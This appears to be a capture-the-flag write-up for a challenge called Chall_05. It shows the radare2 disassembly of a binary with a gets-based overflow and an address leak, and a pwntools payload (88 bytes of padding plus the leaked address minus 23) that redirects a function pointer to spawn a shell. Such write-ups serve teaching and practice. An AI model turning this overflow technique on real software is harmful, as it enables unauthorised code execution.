# Chall_05

## Solution

If we run ```checksec``` we find that there is ```no canary```.

We open the code in radare

```assembly
23: sym.win ();                                                                                                    
│           0x561d557fd1a9      f30f1efa       endbr64                                                               
│           0x561d557fd1ad      55             push rbp                                                              
│           0x561d557fd1ae      4889e5         mov rbp, rsp                                                          
│           0x561d557fd1b1      488d3d500e00.  lea rdi, str._bin_sh    ; 0x561d557fe008 ; "/bin/sh"                  
│           0x561d557fd1b8      e8d3feffff     call sym.imp.system     ;[1] ; int system(const char *string)         
│           0x561d557fd1bd      90             nop                                                                   
│           0x561d557fd1be      5d             pop rbp                                                               
└           0x561d557fd1bf      c3             ret                                                                   
            ; DATA XREF from entry0 @ 0x561d557fd0e1                                                                 
            ; DATA XREF from sym.vuln @ 0x561d557fd1f1                                                               
┌ 37: int main (int argc, char **argv, char **envp);                                                                 
│           0x561d557fd1c0      f30f1efa       endbr64                                                               
│           0x561d557fd1c4      55             push rbp                                                              
│           0x561d557fd1c5      4889e5         mov rbp, rsp                                                          
│           0x561d557fd1c8      488d3d410e00.  lea rdi, str.Follow_the_compass_and_itll_probably_lead_you_in_the_wro
│           0x561d557fd1cf      e8acfeffff     call sym.imp.puts       ;[2] ; int puts(const char *s)                
│           0x561d557fd1d4      b800000000     mov eax, 0                                                            
│           0x561d557fd1d9      e807000000     call sym.vuln           ;[3]                                          
│           0x561d557fd1de      b800000000     mov eax, 0                                                            
│           0x561d557fd1e3      5d             pop rbp                                                               
└           0x561d557fd1e4      c3             ret                                                                   
            ; CALL XREF from main @ 0x561d557fd1d9                                                                   
┌ 62: sym.vuln ();                                                                                                   
│           ; var int64_t var_60h @ rbp-0x60                                                                         
│           ; var int64_t var_8h @ rbp-0x8                                                                           
│           0x561d557fd1e5      f30f1efa       endbr64                                                               
│           0x561d557fd1e9      55             push rbp                                                              
│           0x561d557fd1ea      4889e5         mov rbp, rsp                                                          
│           0x561d557fd1ed      4883ec60       sub rsp, 0x60                                                         
│           0x561d557fd1f1      488d35c8ffff.  lea rsi, [main]         ; 0x561d557fd1c0                              
│           0x561d557fd1f8      488d3d570e00.  lea rdi, str.I_wonder_what_this_is:__p_n    ; 0x561d557fe056 ; "I won
│           0x561d557fd1ff      b800000000     mov eax, 0                                                            
│           0x561d557fd204      e897feffff     call sym.imp.printf     ;[4] ; int printf(const char *format)         
│           0x561d557fd209      488d45a0       lea rax, [var_60h]                                                    
│           0x561d557fd20d      4889c7         mov rdi, rax                                                          
│           0x561d557fd210      b800000000     mov eax, 0                                                            
│           0x561d557fd215      e896feffff     call sym.imp.gets       ;[5] ; char *gets(char *s)                    
│           0x561d557fd21a      488b45f8       mov rax, qword [var_8h]                                               
│           0x561d557fd21e      ffd0           call rax                                                              
│           0x561d557fd220      90             nop                                                                   
│           0x561d557fd221      c9             leave                                                                 
└           0x561d557fd222      c3             ret                                                                   
            0x561d557fd223      662e0f1f8400.  nop word cs:[rax + rax]                                               
            0x561d557fd22d      0f1f00         nop dword [rax]       
```

If we run the program it leaks main's address so if we open up ```ipython``` we can send our modified payload.

Since we want to get to the ```win``` function but the address changes everytime we can rely on the leak given to us. We can see that we have ```0x60``` and ```0x8``` so our junk is at ```88``` and if we subtract the ```main``` and ```win``` functions they are ```23``` spaces apart.
With pwntools we run ```p.recv``` to find the address and then we ```p.sendline(88*b"a" + p64(leakAddress-23))``` and then ```interactive()``` to get root
